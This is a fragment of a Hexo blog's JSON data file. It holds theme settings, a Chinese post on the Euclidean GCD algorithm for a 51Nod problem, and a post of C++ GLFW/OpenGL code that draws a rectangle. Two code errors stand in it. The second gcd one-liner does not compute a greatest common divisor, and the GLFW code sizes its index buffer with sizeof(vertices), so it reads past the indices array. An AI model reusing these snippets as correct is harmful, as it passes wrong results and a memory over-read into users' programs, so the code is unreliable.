enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":247,"excerpt":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>欧几里得算法据说是最早的算法，用于计算最大公约数，也是数论的基础算法之一。</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>51Nod 1011：<a href=\"https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011\">https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011</a><br>","more":"</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"keyword\">int</span> a,<span class=\"keyword\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gcd(b,a%b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"keyword\">int</span> a,<span class=\"keyword\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> b==<span class=\"number\">0</span>?b:(a%b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"延伸\"><a href=\"#延伸\" class=\"headerlink\" title=\"延伸\"></a>延伸</h1><p>扩展欧几里得</p>"},{"title":"GLFW","abbrlink":"d2be7e8","date":"2020-05-19T08:07:05.000Z","_content":"```cpp\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <iostream>\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid processInput(GLFWwindow* window);\n\n// 设置\nconst unsigned int SCR_WIDTH = 800;\nconst unsigned int SCR_HEIGHT = 600;\n\nconst char* vertexShaderSource = \"#version 460 core\\n\"\n\"layout (location = 0) in vec3 aPos;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n\"\n\"}\\0\";\nconst char* fragmentShaderSource = \"#version 460 core\\n\"\n\"out vec4 FragColor;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n\"\n\"}\\n\\0\";\n\nint main()\n{\n    // glfw: 初始化和配置\n    // ------------------------------\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 6);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n    \n    // glfw: Mac OS X 系统需配置以下代码\n    // ------------------------------\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // glfw 窗口创建\n    // --------------------\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"LearnOpenGL\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n\n    // glad: 初始化Glad，加载所有OpenGL函数指针\n    // ---------------------------------------\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n\n    // 构建着色器\n    // ------------------------------------\n    // 顶点着色器\n    int vertexShader = glCreateShader(GL_VERTEX_SHADER);\n    glShaderSource(vertexShader, 1, &vertexShaderSource, NULL);\n    glCompileShader(vertexShader);\n    // 检查着色器编译错误\n    int success;\n    char infoLog[512];\n    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);\n    if (!success)\n    {\n        glGetShaderInfoLog(vertexShader, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n    }\n    // 片段着色器\n    int fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\n    glShaderSource(fragmentShader, 1, &fragmentShaderSource, NULL);\n    glCompileShader(fragmentShader);\n    // 检查片段着色器编译错误\n    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);\n    if (!success)\n    {\n        glGetShaderInfoLog(fragmentShader, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n    }\n    // 连接着色器\n    int shaderProgram = glCreateProgram();\n    glAttachShader(shaderProgram, vertexShader);\n    glAttachShader(shaderProgram, fragmentShader);\n    glLinkProgram(shaderProgram);\n    // 检查连接错误\n    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);\n    if (!success) {\n        glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::PROGRAM::LINKING_FAILED\\n\" << infoLog << std::endl;\n    }\n    glDeleteShader(vertexShader);\n    glDeleteShader(fragmentShader);\n\n    // 设置顶点数据（和缓冲区）并配置顶点属性。\n    // ------------------------------------------------------------------\n    float vertices[] = {\n        0.5f, 0.5f, 0.0f,   // 右上角\n        0.5f, -0.5f, 0.0f,  // 右下角\n        -0.5f, -0.5f, 0.0f, // 左下角\n        -0.5f, 0.5f, 0.0f   // 左上角\n    };\n\n    unsigned int indices[] = { // 注意索引从0开始! \n        0, 1, 3, // 第一个三角形\n        1, 2, 3  // 第二个三角形\n    };\n\n    unsigned int VAO, VBO, EBO;\n    glGenVertexArrays(1, &VAO);\n    glGenBuffers(1, &VBO);\n    glGenBuffers(1, &EBO);\n    // 首先绑定顶点数组对象（VAO），然后绑定并设置顶点缓冲区，然后配置顶点属性。\n    glBindVertexArray(VAO);\n\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(vertices), indices, GL_STATIC_DRAW);\n\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n\n    // 请注意，对glVertexAttribPointer的调用将VBO注册为顶点属性的绑定顶点缓冲区对象是允许的。\n    // 因此之后我们可以安全地解除绑定。\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\n\n    // 之后可以取消绑定VAO，这样其他VAO调用就不会意外修改此VAO，但这很少发生。\n    // 无论如何，修改其他VAO都需要调用glBindVertexArray，因此通常在不直接需要时，我们不会取消绑定VAO（或VBO）。\n    glBindVertexArray(0);\n\n    // 取消注释此调用以绘制线框多边形。\n    //glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);\n\n    // 渲染循环中\n    // -----------\n    while (!glfwWindowShouldClose(window))\n    {\n        // 输入\n        // -----\n        processInput(window);\n\n        // 渲染\n        // ------\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        // 画图\n        glUseProgram(shaderProgram);\n        // 因为只有一个VAO，因此不必每次都绑定它，但是我们这样做是为了使事情更有条理。\n        glBindVertexArray(VAO);\n        glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT,0);\n        // glBindVertexArray(0); // 无需每次都解除绑定。\n\n        // glfw: 交换缓冲区，轮询IO事件（按下/释放，鼠标移动）。\n        // -------------------------------------------------------------------------------\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n\n    // 可选: 一旦超出其目标，则取消分配所有资源。\n    // ------------------------------------------------------------------------\n    glDeleteVertexArrays(1, &VAO);\n    glDeleteBuffers(1, &VBO);\n    glDeleteBuffers(1, &EBO);\n    glDeleteProgram(shaderProgram);\n\n    // glfw: 终止并清除所有先前分配的GLFW资源。\n    // ------------------------------------------------------------------\n    glfwTerminate();\n    return 0;\n}\n\n// 处理所有输: 查询GLFW是否在此框架中 按下/释放 了相关按键并作出相应反应。\n// ---------------------------------------------------------------------------------------------------------\nvoid processInput(GLFWwindow* window)\n{\n    // 当按下Esc时，窗口关闭。\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)\n        glfwSetWindowShouldClose(window, true);\n}\n\n// glfw: 当改变窗口大小时，该回调函数被执行。\n// ---------------------------------------------------------------------------------------------\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height)\n{\n    // 确保视口与新窗口维度相匹配，注意宽高将明显大于视网膜显示屏的宽高。\n    glViewport(0, 0, width, height);\n}\n```","source":"_posts/GLFW.md","raw":"---\ntitle: GLFW\ncategories:\n  - 计算机图形学\n  - OpenGL\ntags:\n  - OpenGL\n  - GLSL\nabbrlink: d2be7e8\ndate: 2020-05-19 16:07:05\n---\n```cpp\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <iostream>\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid processInput(GLFWwindow* window);\n\n// 设置\nconst unsigned int SCR_WIDTH = 800;\nconst unsigned int SCR_HEIGHT = 600;\n\nconst char* vertexShaderSource = \"#version 460 core\\n\"\n\"layout (location = 0) in vec3 aPos;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n\"\n\"}\\0\";\nconst char* fragmentShaderSource = \"#version 460 core\\n\"\n\"out vec4 FragColor;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n\"\n\"}\\n\\0\";\n\nint main()\n{\n    // glfw: 初始化和配置\n    // ------------------------------\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 6);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n    \n    // glfw: Mac OS X 系统需配置以下代码\n    // ------------------------------\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // glfw 窗口创建\n    // --------------------\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"LearnOpenGL\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n\n    // glad: 初始化Glad，加载所有OpenGL函数指针\n    // ---------------------------------------\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n\n    // 构建着色器\n    // ------------------------------------\n    // 顶点着色器\n    int vertexShader = glCreateShader(GL_VERTEX_SHADER);\n    glShaderSource(vertexShader, 1, &vertexShaderSource, NULL);\n    glCompileShader(vertexShader);\n    // 检查着色器编译错误\n    int success;\n    char infoLog[512];\n    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &success);\n    if (!success)\n    {\n        glGetShaderInfoLog(vertexShader, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n    }\n    // 片段着色器\n    int fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\n    glShaderSource(fragmentShader, 1, &fragmentShaderSource, NULL);\n    glCompileShader(fragmentShader);\n    // 检查片段着色器编译错误\n    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &success);\n    if (!success)\n    {\n        glGetShaderInfoLog(fragmentShader, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\\n\" << infoLog << std::endl;\n    }\n    // 连接着色器\n    int shaderProgram = glCreateProgram();\n    glAttachShader(shaderProgram, vertexShader);\n    glAttachShader(shaderProgram, fragmentShader);\n    glLinkProgram(shaderProgram);\n    // 检查连接错误\n    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &success);\n    if (!success) {\n        glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);\n        std::cout << \"ERROR::SHADER::PROGRAM::LINKING_FAILED\\n\" << infoLog << std::endl;\n    }\n    glDeleteShader(vertexShader);\n    glDeleteShader(fragmentShader);\n\n    // 设置顶点数据（和缓冲区）并配置顶点属性。\n    // ------------------------------------------------------------------\n    float vertices[] = {\n        0.5f, 0.5f, 0.0f,   // 右上角\n        0.5f, -0.5f, 0.0f,  // 右下角\n        -0.5f, -0.5f, 0.0f, // 左下角\n        -0.5f, 0.5f, 0.0f   // 左上角\n    };\n\n    unsigned int indices[] = { // 注意索引从0开始! \n        0, 1, 3, // 第一个三角形\n        1, 2, 3  // 第二个三角形\n    };\n\n    unsigned int VAO, VBO, EBO;\n    glGenVertexArrays(1, &VAO);\n    glGenBuffers(1, &VBO);\n    glGenBuffers(1, &EBO);\n    // 首先绑定顶点数组对象（VAO），然后绑定并设置顶点缓冲区，然后配置顶点属性。\n    glBindVertexArray(VAO);\n\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(vertices), indices, GL_STATIC_DRAW);\n\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n\n    // 请注意，对glVertexAttribPointer的调用将VBO注册为顶点属性的绑定顶点缓冲区对象是允许的。\n    // 因此之后我们可以安全地解除绑定。\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\n\n    // 之后可以取消绑定VAO，这样其他VAO调用就不会意外修改此VAO，但这很少发生。\n    // 无论如何，修改其他VAO都需要调用glBindVertexArray，因此通常在不直接需要时，我们不会取消绑定VAO（或VBO）。\n    glBindVertexArray(0);\n\n    // 取消注释此调用以绘制线框多边形。\n    //glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);\n\n    // 渲染循环中\n    // -----------\n    while (!glfwWindowShouldClose(window))\n    {\n        // 输入\n        // -----\n        processInput(window);\n\n        // 渲染\n        // ------\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        // 画图\n        glUseProgram(shaderProgram);\n        // 因为只有一个VAO，因此不必每次都绑定它，但是我们这样做是为了使事情更有条理。\n        glBindVertexArray(VAO);\n        glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT,0);\n        // glBindVertexArray(0); // 无需每次都解除绑定。\n\n        // glfw: 交换缓冲区，轮询IO事件（按下/释放，鼠标移动）。\n        // -------------------------------------------------------------------------------\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n\n    // 可选: 一旦超出其目标，则取消分配所有资源。\n    // ------------------------------------------------------------------------\n    glDeleteVertexArrays(1, &VAO);\n    glDeleteBuffers(1, &VBO);\n    glDeleteBuffers(1, &EBO);\n    glDeleteProgram(shaderProgram);\n\n    // glfw: 终止并清除所有先前分配的GLFW资源。\n    // ------------------------------------------------------------------\n    glfwTerminate();\n    return 0;\n}\n\n// 处理所有输: 查询GLFW是否在此框架中 按下/释放 了相关按键并作出相应反应。\n// ---------------------------------------------------------------------------------------------------------\nvoid processInput(GLFWwindow* window)\n{\n    // 当按下Esc时，窗口关闭。\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)\n        glfwSetWindowShouldClose(window, true);\n}\n\n// glfw: 当改变窗口大小时，该回调函数被执行。\n// ---------------------------------------------------------------------------------------------\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height)\n{\n    // 确保视口与新窗口维度相匹配，注意宽高将明显大于视网膜显示屏的宽高。\n    glViewport(0, 0, width, height);\n}\n```","slug":"GLFW","published":1,"updated":"2020-05-19T08:10:51.850Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkat000zqse53y259ibe","content":"<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;glad/glad.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;GLFW/glfw3.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">framebuffer_size_callback</span><span class=\"params\">(GLFWwindow* window, <span class=\"keyword\">int</span> width, <span class=\"keyword\">int</span> height)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">processInput</span><span class=\"params\">(GLFWwindow* window)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> SCR_WIDTH = <span class=\"number\">800</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> SCR_HEIGHT = <span class=\"number\">600</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* vertexShaderSource = <span class=\"string\">&quot;#version 460 core\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;layout (location = 0) in vec3 aPos;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;void main()\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#123;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#125;\\0&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* fragmentShaderSource = <span class=\"string\">&quot;#version 460 core\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;out vec4 FragColor;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;void main()\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&#123;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n&quot;</span></span><br><span class=\"line\"><span 